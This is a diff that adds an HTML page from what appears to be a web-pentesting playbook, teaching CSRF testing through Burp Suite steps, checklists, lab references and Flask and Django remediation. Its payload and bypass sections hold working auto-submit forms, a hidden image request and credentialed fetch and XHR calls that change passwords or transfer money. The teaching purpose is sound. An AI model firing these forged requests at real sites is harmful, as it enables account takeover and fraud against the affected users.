@@ -1,0 +1,703 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <!-- Clickjacking defense: hide content until JS confirms top frame -->
+  <style id="cj-guard">html{display:none!important}</style>
+  <script>(function(){if(self===top){var s=document.getElementById('cj-guard');if(s)s.parentNode.removeChild(s);}else{try{top.location.href=self.location.href;}catch(e){}}})();</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="CSRF vulnerability testing guide: token bypass, SameSite cookie bypass, and PoC generation. Includes Burp Suite workflow and PortSwigger labs.">
+    <meta property="og:title" content="CSRF – Web App Pentesting Guide">
+    <meta property="og:description" content="CSRF vulnerability testing guide: token bypass, SameSite cookie bypass, and PoC generation. Includes Burp Suite workflow and PortSwigger labs.">
+    <meta property="og:type" content="article">
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%237c3aed' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/%3E%3C/svg%3E">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <title>CSRF  · Web Pentest Playbook</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="topnav">
+  <div class="nav-logo">
+    <a href="../index.html" class="logo-link">
+      <div class="logo-icon">
+        <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><path d="M5 9v3M9 9v3M3.5 12h7" stroke="#a78bfa" stroke-width="1.2" stroke-linecap="round"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+      </div>
+      <span class="logo-text">Web Pentest</span>
+      <span class="logo-tag">v2025</span>
+    </a>
+  </div>
+  <div class="nav-center">
+    <a href="../index.html" class="nav-link">Home</a>
+    <a href="../index.html" class="nav-link active">Vulnerabilities</a>
+    <a href="../web-pentest-playbook.html" class="nav-link">Playbook</a>
+    <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="nav-link">Labs ↗</a>
+    <a href="../thanks.html" class="nav-link">Thanks</a>
+  </div>
+  <div class="nav-right">
+    <button class="search-pill" onclick="gsOpen ? gsOpen() : null">
+      <svg width="11" height="11" viewBox="0 0 16 16" fill="none"><circle cx="7" cy="7" r="5" stroke="currentColor" stroke-width="1.5"/><path d="m11 11 3 3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
+      Search <kbd>⌘K</kbd>
+    </button>
+    <button class="hamburger" id="hamburger" aria-label="Menu">☰</button>
+    <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme">☀ Light</button>
+  </div>
+</nav>
+
+<div class="sidebar-overlay" id="sidebar-overlay"></div>
+<div class="layout">
+  <nav id="sidebar">
+    <div class="toc-title">CSRF</div>
+    <div class="sb-group">Overview</div>
+    <a href="#analogy">Real-World Analogy</a>
+    <a href="#methodology">📅 Workflow Placement</a>
+    <a href="#how-it-works">How It Works</a>
+    <div class="sb-group">Attack Vectors</div>
+    <a href="#where-to-look">Where to Look</a>
+    <a href="#burp-workflow">Burp Suite Workflow</a>
+    <div class="sb-group">Exploitation</div>
+    <a href="#payloads">Payloads & Techniques</a>
+    <a href="#waf-bypass">WAF Bypass Techniques</a>
+    <a href="#exploitation">Exploitation & Impact</a>
+    <div class="sb-group">Practice</div>
+    <a href="#checklist">Testing Checklist</a>
+    <a href="#labs">PortSwigger Labs</a>
+    <a href="#remediation">Remediation</a>
+    <a href="#mistakes">Common Beginner Mistakes</a>
+    <a href="#see-also">🔗 See Also</a>
+  </nav>
+
+  <main id="main">
+    <div class="hero">
+      <div class="hero-chip"><span class="hero-chip-dot"></span>OWASP A05 · CVSS 8.8 · Day 3</div>
+      <h1><span class="hero-icon-pill"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true"><polyline points="17 2 21 6 17 10"/><path d="M3 11V9a4 4 0 0 1 4-4h14"/><polyline points="7 22 3 18 7 14"/><path d="M21 13v2a4 4 0 0 1-4 4H3"/></svg></span><span>CSRF (Cross-Site Request Forgery)</span></h1>
+      <p>Trick a user into performing unintended actions on their account through a malicious website while they're logged in.</p>
+      <div class="badge-row">
+        <span class="badge badge-high">High</span>
+        <span class="badge badge-bscp">BSCP Exam Topic</span>
+        <span class="badge badge-difficulty">Difficulty: Beginner</span>
+      </div>
+    </div>
+
+    <section id="analogy">
+      <h2>🎯 Real-World Analogy</h2>
+      <div class="callout analogy">
+        <div class="callout-title">The Blank Check Scam</div>
+        <p>You receive an email: "Click here to claim your prize!" You click the link while logged into your bank account. The page loads an invisible form that auto-submits a request to your bank, transferring $1,000 to a stranger's account. The bank server sees your valid session cookie and your valid digital signature, so it approves the transfer. You didn't intend to sign that check  · the attacker tricked you into it.</p>
+        <p>CSRF works the same way: the browser auto-includes your login cookie with requests to the target site, so a malicious page can forge requests that look like they came from you.</p>
+      </div>
+    </section>
+
+    <h2 id="methodology">📅 When in the 5-Day Workflow</h2>
+
+    <div class="workflow-days">
+      <div class="day-pill"><span class="day-num">Day 1</span>Recon</div>
+      <div class="day-pill"><span class="day-num">Day 2</span>Auth/IDOR</div>
+      <div class="day-pill deep"><span class="day-num">Day 3</span>Deep Dive</div>
+      <div class="day-pill"><span class="day-num">Day 4</span>Server-Side</div>
+      <div class="day-pill"><span class="day-num">Day 5</span>Client-Side</div>
+    </div>
+
+    <div class="callout method-deep">
+      <div class="callout-title">🎯 Day 3  · CSRF Testing</div>
+      <p>On Day 3, examine every state-changing request in Burp HTTP history. For each POST/PUT/DELETE that changes state (password, email, settings, money transfer): check if a CSRF token is present. If yes  · is it actually validated server-side? Test by removing it or changing one character. If no token  · build a quick auto-submit PoC form and test in a second browser session.</p>
+      <pre><code>&lt;!-- Quick CSRF PoC test --&gt;
+&lt;form action="https://target.com/account/change-email" method="POST"&gt;
+  &lt;input name="email" value="attacker@evil.com"&gt;
+  &lt;input type="submit" value="Auto-submit"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</code></pre>
+      <p>Also check: does a GET version of the action exist? Does it work without a token? Does changing <code>Content-Type: application/json</code> bypass the check?</p>
+      <p><strong>Chain it:</strong> CSRF → change victim's email → trigger password reset → full account takeover. Or CSRF → add attacker's SSH key → persistent access.</p>
+    </div>
+
+    <section id="how-it-works">
+      <h2>⚙️ How It Works</h2>
+      <h3>The Core Problem</h3>
+      <p>Browsers automatically include cookies in HTTP requests to the target domain, even if the request originates from another site. This design allows for convenience (you stay logged in), but it also enables forgery:</p>
+      <ol>
+        <li><strong>You log into your-bank.com</strong>  · your browser stores a session cookie: <code>sessionid=abc123</code></li>
+        <li><strong>You visit attacker.com</strong> (while still logged into the bank)</li>
+        <li><strong>Attacker.com contains a hidden form:</strong>
+          <pre><code>&lt;form action="https://your-bank.com/transfer" method="POST"&gt;
+  &lt;input type="hidden" name="to_account" value="attacker_account"&gt;
+  &lt;input type="hidden" name="amount" value="1000"&gt;
+&lt;/form&gt;
+&lt;script&gt;
+  document.forms[0].submit();
+&lt;/script&gt;</code></pre>
+        </li>
+        <li><strong>Your browser submits the form</strong>  · and automatically includes your <code>sessionid=abc123</code> cookie</li>
+        <li><strong>Your-bank.com receives the request:</strong> It checks: "Is the sessionid valid?" Yes. "Is this a legit transfer request?" It assumes yes, because the request came with a valid session.</li>
+        <li><strong>The transfer happens</strong>  · and you didn't authorize it.</li>
+      </ol>
+
+      <h3>Why It Happens</h3>
+      <p>The server has no way to distinguish between:</p>
+      <ul>
+        <li>A request you intentionally made (clicking a button on your-bank.com)</li>
+        <li>A forged request from attacker.com that your browser auto-submitted</li>
+      </ul>
+      <p>Both include your valid session cookie. Both come from your IP address. Without a <strong>CSRF token</strong> (a unique, unpredictable value that the page generates and the server validates), the server cannot prove you intended the request.</p>
+    </section>
+
+    <section id="where-to-look">
+      <h2>🔍 Where to Look</h2>
+      <h3>What Requests Are Vulnerable?</h3>
+      <p>CSRF only affects <strong>state-changing requests</strong>. Safe requests (reads) are not vulnerable:</p>
+      <ul>
+        <li><strong>Vulnerable:</strong> POST, PUT, DELETE, PATCH (change data)</li>
+        <li><strong>Not vulnerable:</strong> GET (read-only)</li>
+      </ul>
+
+      <h3>High-Risk Endpoints</h3>
+      <ul>
+        <li><strong>Password change:</strong> <code>POST /account/change-password</code></li>
+        <li><strong>Email change:</strong> <code>POST /account/update-email</code></li>
+        <li><strong>Payment/transfer:</strong> <code>POST /transfer</code>, <code>POST /payment/charge</code></li>
+        <li><strong>Account settings:</strong> <code>POST /settings/update</code></li>
+        <li><strong>Delete account:</strong> <code>DELETE /account</code></li>
+        <li><strong>Add admin user:</strong> <code>POST /admin/users</code></li>
+        <li><strong>Disable 2FA:</strong> <code>POST /security/disable-2fa</code></li>
+      </ul>
+
+      <h3>How to Check for CSRF Protection</h3>
+      <ol>
+        <li>Open the page with the state-changing form in your browser</li>
+        <li>Right-click → Inspect → look for a hidden input field like:
+          <pre><code>&lt;input type="hidden" name="csrf_token" value="a1b2c3d4..."&gt;</code></pre>
+        </li>
+        <li>If no token exists, the form is likely vulnerable</li>
+        <li>If a token exists, check if it's:
+          <ul>
+            <li>Unique per request or per session?</li>
+            <li>Server-side validated on submission?</li>
+            <li>Tied to the user's session?</li>
+          </ul>
+        </li>
+      </ol>
+
+      <h3>Check Cookie SameSite Attribute</h3>
+      <p>Modern CSRF defense: browsers can restrict when cookies are sent cross-site. In Burp or DevTools, check the session cookie:</p>
+      <ul>
+        <li><strong>SameSite=Strict:</strong> Cookie only sent to same site (best)</li>
+        <li><strong>SameSite=Lax:</strong> Cookie sent on top-level navigations (safe for most cases)</li>
+        <li><strong>No SameSite or SameSite=None:</strong> Cookie sent on all cross-site requests (vulnerable)</li>
+      </ul>
+    </section>
+
+    <section id="burp-workflow">
+      <h2>🎯 Burp Suite Workflow</h2>
+
+      <div class="burp-step">
+        <div class="step-num">1</div>
+        <div>
+          <strong>Find a state-changing request</strong>
+          <p>Log in to the target application. Perform an action that changes state (change password, update email, transfer money). Intercept the POST/PUT request in Burp Proxy.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">2</div>
+        <div>
+          <strong>Send to Repeater</strong>
+          <p>Right-click the request → "Send to Repeater". This lets you replay the request multiple times.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">3</div>
+        <div>
+          <strong>Remove or modify the CSRF token</strong>
+          <p>Find the CSRF token in the request body (e.g., <code>csrf_token=abc123</code>). Try:</p>
+          <ul>
+            <li>Delete it entirely</li>
+            <li>Change it to a random value like <code>csrf_token=invalid123</code></li>
+            <li>Copy a token from a different request</li>
+          </ul>
+          <p>Click "Send" and check the response. If the request succeeds (HTTP 200, no error message), the app isn't validating the token  · it's vulnerable.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">4</div>
+        <div>
+          <strong>Generate a CSRF PoC</strong>
+          <p>Right-click the original request → "Engagement tools" → "Generate CSRF PoC". Burp creates an HTML file with a form that mimics the request. It looks like:</p>
+          <pre><code>&lt;form action="https://target.com/change-password" method="POST"&gt;
+  &lt;input type="hidden" name="new_password" value="hacked123"&gt;
+  &lt;input type="hidden" name="csrf_token" value="abc123"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</code></pre>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">5</div>
+        <div>
+          <strong>Test the PoC</strong>
+          <p>Save the PoC to a file. Open it in a browser while logged into the target app (in the same browser instance). If the hidden form auto-submits and the action completes, CSRF is confirmed.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">6</div>
+        <div>
+          <strong>Check SameSite cookie attribute</strong>
+          <p>Go to Burp → "Cookies" (under Proxy settings) or check DevTools Application → Cookies. Look for the session cookie and note its "SameSite" value. If it's None or missing, that's a secondary vulnerability.</p>
+        </div>
+      </div>
+    </section>
+
+    <section id="payloads">
+      <h2>🎣 Payloads & Techniques</h2>
+
+      <h3>1. Auto-Submit HTML Form (GET Method)</h3>
+      <p>If the vulnerable endpoint accepts GET:</p>
+      <pre><code>&lt;img src="https://target.com/transfer?to=attacker&amount=9999" style="display:none"&gt;</code></pre>
+      <p>The browser loads the image, which triggers the request with your session cookie.</p>
+
+      <h3>2. Auto-Submit HTML Form (POST Method)</h3>
+      <pre><code>&lt;html&gt;
+&lt;body onload="document.forms[0].submit()"&gt;
+&lt;form action="https://target.com/change-password" method="POST"&gt;
+  &lt;input type="hidden" name="new_password" value="hacked123"&gt;
+  &lt;input type="hidden" name="confirm_password" value="hacked123"&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+      <h3>3. JSON CSRF (Content-Type Trick)</h3>
+      <p>Many modern apps use JSON APIs. If the app doesn't enforce CSRF on JSON endpoints, you can forge JSON requests:</p>
+      <pre><code>&lt;script&gt;
+const xhr = new XMLHttpRequest();
+xhr.open('POST', 'https://target.com/api/transfer', true);
+xhr.withCredentials = true;
+xhr.setRequestHeader('Content-Type', 'application/json');
+xhr.send(JSON.stringify({
+  "to_account": "attacker",
+  "amount": 1000
+}));
+&lt;/script&gt;</code></pre>
+      <p>This only works if the app doesn't require a CSRF token for JSON requests.</p>
+
+      <h3>4. Multipart Form CSRF</h3>
+      <pre><code>&lt;form action="https://target.com/upload-avatar" method="POST" enctype="multipart/form-data"&gt;
+  &lt;input type="file" name="avatar" value="/tmp/malicious.jpg"&gt;
+  &lt;input type="submit"&gt;
+&lt;/form&gt;</code></pre>
+
+      <h3>5. Modifying Token to Null or Empty</h3>
+      <p>Some apps fail open when the token is missing. Try:</p>
+      <ul>
+        <li><code>csrf_token=</code> (empty string)</li>
+        <li><code>csrf_token=null</code> (literal null)</li>
+        <li><code>csrf_token=0</code></li>
+        <li>Omit the parameter entirely</li>
+      </ul>
+    </section>
+
+    <section id="checklist">
+      <h2>✅ Testing Checklist</h2>
+      <div class="checklist-wrap">
+        <div class="checklist-header">Progress: <span class="progress-mini">0/11</span></div>
+        <div class="progress-bar-wrap"><div class="progress-bar"></div></div>
+
+        <label class="checklist-item">
+          <input type="checkbox">
+          <label>Identify all POST/PUT/DELETE endpoints that change state</label>
+        </label>
+
+        <label class="checklist-item">
+          <input type="checkbox">
+          <label>Check if CSRF token is present in the form or request body</label>
+        </label>
+
+        <label class="checklist-item">
+          <input type="checkbox">
+          <label>Remove or modify the CSRF token and resend; check if request succeeds</label>
+        </label>
+
+        <label class="checklist-item">
+          <input type="checkbox">
+          <label>Test token reuse: copy token from one request to another; does it work?</label>
+        </label>
+
+        <label class="checklist-item">
+          <input type="checkbox">
+          <label>Check if token is tied to session or user (log in as different user; can you use their token?)</label>
+        </label>
+
+        <label class="checklist-item">
+          <input type="checkbox">
+          <label>Generate Burp CSRF PoC and test in another browser session while logged in</label>
+        </label>
+
+        <label class="checklist-item">
+          <input type="checkbox">
+          <label>Check session cookie for SameSite attribute and value</label>
+        </label>
+
+        <label class="checklist-item">
+          <input type="checkbox">
+          <label>Try GET method requests to sensitive endpoints (are they accepted?)</label>
+        </label>
+
+        <label class="checklist-item">
+          <input type="checkbox">
+          <label>Test JSON APIs without CSRF tokens</label>
+        </label>
+
+        <label class="checklist-item">
+          <input type="checkbox">
+          <label>Try bypassing token validation with HTTP verb tampering (POST→PUT, POST→PATCH)</label>
+        </label>
+
+        <label class="checklist-item">
+          <input type="checkbox">
+          <label>Check if Origin and Referer headers are validated server-side</label>
+        </label>
+      </div>
+    </section>
+
+    <section id="waf-bypass">
+      <h2>🚀 WAF Bypass Techniques</h2>
+
+      <h3>1. HTTP Method Variation</h3>
+      <p>If POST is protected but PUT is not:</p>
+      <pre><code>&lt;form action="https://target.com/settings" method="POST"&gt;
+  &lt;!-- Try changing to PUT via override header --&gt;
+  &lt;input type="hidden" name="_method" value="PUT"&gt;
+  &lt;input type="hidden" name="email" value="attacker@example.com"&gt;
+&lt;/form&gt;</code></pre>
+
+      <h3>2. SameSite Bypass via Subdomain</h3>
+      <p>If the app uses <code>SameSite=Lax</code> but has an open subdomain (e.g., <code>files.target.com</code>), you can host the PoC there and bypass SameSite:</p>
+      <pre><code>https://files.target.com/csrf-poc.html (hosted by attacker, but SameSite allows it)</code></pre>
+
+      <h3>3. Cookie Tossing with Subdomain</h3>
+      <p>If the app sets cookies on <code>.target.com</code>, an attacker-controlled subdomain can set a cookie that shadows the session:</p>
+      <pre><code>Set-Cookie: sessionid=attacker_controlled_value; Domain=.target.com</code></pre>
+
+      <h3>4. Crafting Requests Without HTML Forms</h3>
+      <p>If HTML forms are blocked, use JavaScript fetch:</p>
+      <pre><code>&lt;script&gt;
+fetch('https://target.com/api/transfer', {
+  method: 'POST',
+  credentials: 'include',
+  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+  body: 'to_account=attacker&amount=1000'
+});
+&lt;/script&gt;</code></pre>
+
+      <h3>5. Timing Window Exploitation</h3>
+      <p>If CSRF tokens are single-use but have a wide validation window, forge multiple requests in rapid succession before the token expires.</p>
+    </section>
+
+    <section id="exploitation">
+      <h2>💥 Exploitation & Impact</h2>
+
+      <h3>What Can an Attacker Do?</h3>
+      <ul>
+        <li><strong>Account Takeover:</strong> Change password, email, recovery phone  · lock the real user out</li>
+        <li><strong>Financial Fraud:</strong> Transfer money, make purchases, update payment methods</li>
+        <li><strong>Privilege Escalation:</strong> Promote themselves to admin in a CMS or application</li>
+        <li><strong>Data Destruction:</strong> Delete user data, reset configurations</li>
+        <li><strong>Malware Distribution:</strong> Upload malicious files, inject scripts into user profiles</li>
+        <li><strong>Service Disruption:</strong> Spam other users, disable security features</li>
+      </ul>
+
+      <h3>Real-World Example: GitHub CSRF (2010)</h3>
+      <p>GitHub (before modern CSRF fixes) had a vulnerability where an attacker could trick a logged-in user into adding their SSH public key to the victim's account via a CSRF form. This granted the attacker access to all repositories the victim could access.</p>
+
+      <h3>Proof-of-Concept Scenario</h3>
+      <p>Attacker sends victim an email with a link to a seemingly innocent page. The page contains a hidden form that changes the victim's password. After one click, the attacker controls the victim's account.</p>
+    </section>
+
+    <section id="remediation">
+      <h2>🛡️ Remediation</h2>
+
+      <h3>1. CSRF Tokens (Double-Submit Cookie Pattern)</h3>
+      <p><strong>Server-side (Python/Flask example):</strong></p>
+      <pre><code>from flask import session, request
+import secrets
+
+@app.route('/transfer', methods=['POST'])
+def transfer():
+    # Validate CSRF token
+    token = request.form.get('csrf_token')
+    session_token = session.get('csrf_token')
+
+    if not token or token != session_token:
+        return "CSRF token invalid", 403
+
+    # Proceed with transfer
+    to_account = request.form.get('to_account')
+    amount = request.form.get('amount')
+    # ... transfer logic ...
+    return "Transfer successful", 200
+
+@app.route('/transfer-form')
+def transfer_form():
+    # Generate a unique token per session
+    if 'csrf_token' not in session:
+        session['csrf_token'] = secrets.token_hex(32)
+
+    return render_template('transfer.html', csrf_token=session['csrf_token'])</code></pre>
+
+      <p><strong>Template (transfer.html):</strong></p>
+      <pre><code>&lt;form method="POST" action="/transfer"&gt;
+  &lt;input type="hidden" name="csrf_token" value="{{ csrf_token }}"&gt;
+  &lt;input type="text" name="to_account" placeholder="Account number"&gt;
+  &lt;input type="number" name="amount" placeholder="Amount"&gt;
+  &lt;button type="submit"&gt;Transfer&lt;/button&gt;
+&lt;/form&gt;</code></pre>
+
+      <h3>2. SameSite Cookie Attribute</h3>
+      <p><strong>Server-side (set session cookie with SameSite=Strict):</strong></p>
+      <pre><code>response.set_cookie('sessionid',
+                     value=session_value,
+                     httponly=True,
+                     secure=True,
+                     samesite='Strict')</code></pre>
+
+      <p><strong>SameSite values:</strong></p>
+      <ul>
+        <li><code>Strict</code>: Cookie never sent cross-site (most secure, may break some workflows)</li>
+        <li><code>Lax</code>: Cookie sent on top-level navigations (default in most browsers, good balance)</li>
+        <li><code>None</code>: Cookie sent on all requests (requires Secure flag; only use if necessary)</li>
+      </ul>
+
+      <h3>3. Validate Origin and Referer Headers</h3>
+      <pre><code>@app.route('/transfer', methods=['POST'])
+def transfer():
+    origin = request.headers.get('Origin') or request.headers.get('Referer')
+    allowed_origins = ['https://myapp.com', 'https://www.myapp.com']
+
+    if origin not in allowed_origins:
+        return "Forbidden", 403
+
+    # ... rest of logic ...</code></pre>
+
+      <h3>4. Use a CSRF Token Library</h3>
+      <p><strong>Django:</strong> Built-in CSRF middleware (automatically validates tokens)</p>
+      <pre><code>{% csrf_token %}</code></pre>
+
+      <p><strong>Flask:</strong> Use Flask-WTF library</p>
+      <pre><code>from flask_wtf.csrf import CSRFProtect
+csrf = CSRFProtect(app)</code></pre>
+
+      <h3>5. For APIs (REST/JSON)</h3>
+      <p>Don't rely on cookies; use token-based authentication (JWT, API keys):</p>
+      <pre><code>fetch('https://target.com/api/transfer', {
+  method: 'POST',
+  headers: {
+    'Authorization': 'Bearer ' + jwt_token,
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({ to_account: 'x', amount: 100 })
+});</code></pre>
+      <p>CSRF tokens are needed only if you're using cookies for session management.</p>
+    </section>
+
+    <section id="labs">
+      <h2>📚 PortSwigger Labs</h2>
+      <p>Practice CSRF exploitation on PortSwigger's free labs:</p>
+      <ul>
+        <li><strong>CSRF vulnerability with no defenses:</strong> Change email with no token validation</li>
+        <li><strong>CSRF where token validation depends on request method:</strong> Use GET instead of POST</li>
+        <li><strong>CSRF where token validation depends on token being present:</strong> Omit token entirely</li>
+        <li><strong>CSRF where token is not tied to user session:</strong> Swap tokens between users</li>
+        <li><strong>CSRF where token is tied to non-session cookie:</strong> Forge both cookies</li>
+        <li><strong>CSRF where token is duplicated in body and URL:</strong> Abuse token reuse</li>
+        <li><strong>SameSite=Lax bypass via browser behavior:</strong> Exploit form navigation</li>
+        <li><strong>SameSite=Strict bypass via client-side redirect:</strong> Use open redirect</li>
+        <li><strong>CSRF with broken Referer validation:</strong> Bypass origin check</li>
+        <li><strong>CSRF with SameSite=None:</strong> Direct cross-site request</li>
+        <li><strong>CSRF tokens not exchanged on state-changing requests:</strong> Exploit missing protection on specific endpoints</li>
+        <li><strong>CSRF via XSS:</strong> Combine vulnerabilities for maximum impact</li>
+      </ul>
+    </section>
+
+    <section id="mistakes">
+      <h2>⚠️ Common Beginner Mistakes</h2>
+
+      <h3>1. Assuming JSON Requests Are CSRF-Safe</h3>
+      <p><strong>Wrong:</strong> "The app uses JSON API, so it's safe from CSRF."</p>
+      <p><strong>Reality:</strong> You can send JSON requests from a browser if cookies are included. CSRF still applies unless the app requires a token or has SameSite cookies.</p>
+
+      <h3>2. Not Checking SameSite Cookie Attribute</h3>
+      <p><strong>Wrong:</strong> Testing CSRF by removing the token but forgetting to check if SameSite=Strict is set.</p>
+      <p><strong>Reality:</strong> If SameSite=Strict is set, the browser won't send the cookie cross-site anyway  · that's defense, not vulnerability. But if it's missing or set to None, CSRF is still possible.</p>
+
+      <h3>3. Testing CSRF Only in the Same Browser Session</h3>
+      <p><strong>Wrong:</strong> Opening the PoC in the same browser tab while already logged in, but not opening it in the "normal browsing flow" (where cookies are auto-sent).</p>
+      <p><strong>Reality:</strong> Cookies are sent automatically in any request to the target domain, even cross-site  · you don't need to "manually" add them. Your browser does it.</p>
+
+      <h3>4. Not Testing GET-Based CSRF</h3>
+      <p><strong>Wrong:</strong> Only testing POST endpoints for CSRF.</p>
+      <p><strong>Reality:</strong> Some state-changing operations accept GET (a design flaw). These are highly vulnerable to CSRF because even an image tag or redirect can trigger them.</p>
+
+      <h3>5. Ignoring HTTP Method Overrides</h3>
+      <p><strong>Wrong:</strong> The form uses POST, and the app seems to reject GET  · conclusion: not vulnerable.</p>
+      <p><strong>Reality:</strong> Check if the app accepts method override headers like <code>X-HTTP-Method-Override: PUT</code> or <code>_method=PUT</code> in the form body. Some frameworks support this for API compatibility.</p>
+
+      <h3>6. Not Testing Token Reuse Across Requests</h3>
+      <p><strong>Wrong:</strong> A token is valid, so CSRF protection must be working.</p>
+      <p><strong>Reality:</strong> If the same token works for multiple different requests, it's not tied to the specific action  · an attacker can reuse it. Test by using the same token in different requests (change password vs. change email).</p>
+
+      <h3>7. Missing Indirect References</h3>
+      <p><strong>Wrong:</strong> Testing obvious form parameters but not checking hidden fields or POST body parameters.</p>
+      <p><strong>Reality:</strong> CSRF tokens are often in hidden inputs or nested JSON  · always inspect the full request body, not just the visible form fields.</p>
+    </section>
+
+    <!-- ═══ SEE ALSO ═══ -->
+    <h2 id="see-also">🔗 See Also  · Attack Chains</h2>
+    <p>CSRF is most dangerous when chained  · a CSRF on an email-change endpoint leads to full account takeover.</p>
+    <div class="see-also-grid">
+      <a class="see-also-card" href="xss.html">
+        <span class="sa-icon">⚡</span>
+        <span class="sa-name">XSS</span>
+        <span class="sa-why">XSS makes CSRF trivial  · execute any state-changing request from victim's authenticated session.</span>
+      </a>
+      <a class="see-also-card" href="cors.html">
+        <span class="sa-icon">🌍</span>
+        <span class="sa-name">CORS</span>
+        <span class="sa-why">Both exploit browser trust. Misconfigured CORS + CSRF = attacker reads AND writes cross-origin.</span>
+      </a>
+      <a class="see-also-card" href="clickjacking.html">
+        <span class="sa-icon">🖱️</span>
+        <span class="sa-name">Clickjacking</span>
+        <span class="sa-why">Clickjacking is a variant of CSRF  · tricks user into performing an action via invisible iframe.</span>
+      </a>
+      <a class="see-also-card" href="oauth.html">
+        <span class="sa-icon">🔗</span>
+        <span class="sa-name">OAuth</span>
+        <span class="sa-why">Missing state parameter in OAuth is essentially CSRF on the authorization flow.</span>
+      </a>
+    </div>
+
+  </main>
+</div>
+
+<script>
+// Copy buttons
+document.querySelectorAll('pre').forEach(pre => {
+  const btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.textContent = 'Copy';
+  pre.appendChild(btn);
+  btn.addEventListener('click', () => {
+    navigator.clipboard.writeText(pre.querySelector('code')?.innerText || pre.innerText);
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+});
+
+// Active sidebar nav on scroll
+const sections = document.querySelectorAll('[id]');
+const navLinks = document.querySelectorAll('#sidebar a');
+const observer = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      navLinks.forEach(a => a.classList.toggle('active', a.getAttribute('href') === '#' + e.target.id));
+    }
+  });
+}, { rootMargin: '-20% 0px -70% 0px' });
+sections.forEach(s => observer.observe(s));
+
+// Checklist persistence
+const STORAGE_KEY = 'csrf-checklist-';
+document.querySelectorAll('.checklist-item input[type=checkbox]').forEach((cb, i) => {
+  const saved = localStorage.getItem(STORAGE_KEY + i);
+  if (saved === 'true') { cb.checked = true; cb.closest('.checklist-item').classList.add('done'); }
+  cb.addEventListener('change', () => {
+    localStorage.setItem(STORAGE_KEY + i, cb.checked);
+    cb.closest('.checklist-item').classList.toggle('done', cb.checked);
+    updateProgress();
+  });
+});
+function updateProgress() {
+  document.querySelectorAll('.checklist-wrap').forEach(wrap => {
+    const all = wrap.querySelectorAll('input[type=checkbox]');
+    const done = wrap.querySelectorAll('input[type=checkbox]:checked');
+    const mini = wrap.querySelector('.progress-mini');
+    const bar = wrap.querySelector('.progress-bar');
+    if (mini) mini.textContent = done.length + '/' + all.length;
+    if (bar) bar.style.width = (all.length ? (done.length/all.length*100) : 0) + '%';
+  });
+}
+updateProgress();
+</script>
+
+<script>
+(function(){
+  var t = localStorage.getItem('theme') || 'dark';
+  document.documentElement.setAttribute('data-theme', t);
+  var btn = document.getElementById('theme-toggle');
+  if(btn){
+    btn.textContent = t === 'dark' ? '☀ Light' : '🌙 Dark';
+    btn.addEventListener('click', function(){
+      var n = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+      document.documentElement.setAttribute('data-theme', n);
+      localStorage.setItem('theme', n);
+      btn.textContent = n === 'dark' ? '☀ Light' : '🌙 Dark';
+    });
+  }
+  var ham = document.getElementById('hamburger');
+  var sb = document.getElementById('sidebar');
+  var ov = document.getElementById('sidebar-overlay');
+  if(ham && sb && ov){
+    ham.addEventListener('click', function(){ sb.classList.toggle('open'); ov.classList.toggle('open'); });
+    ov.addEventListener('click', function(){ sb.classList.remove('open'); ov.classList.remove('open'); });
+  }
+})();
+</script>
+<script src="search.js"></script>
+
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <a href="../index.html" class="footer-logo-link">
+          <div class="footer-logo-icon">
+            <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg" width="15" height="15"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+          </div>
+          <span class="footer-logo-text">Web Pentest Playbook</span>
+        </a>
+        <p class="footer-tagline">A workflow-first reference for web application security testing.</p>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Vulnerabilities</div>
+        <a href="sqli.html" class="footer-link">SQL Injection</a>
+        <a href="xss.html" class="footer-link">XSS</a>
+        <a href="ssrf.html" class="footer-link">SSRF</a>
+        <a href="jwt.html" class="footer-link">JWT Attacks</a>
+        <a href="../index.html" class="footer-link">+ 19 more →</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Resources</div>
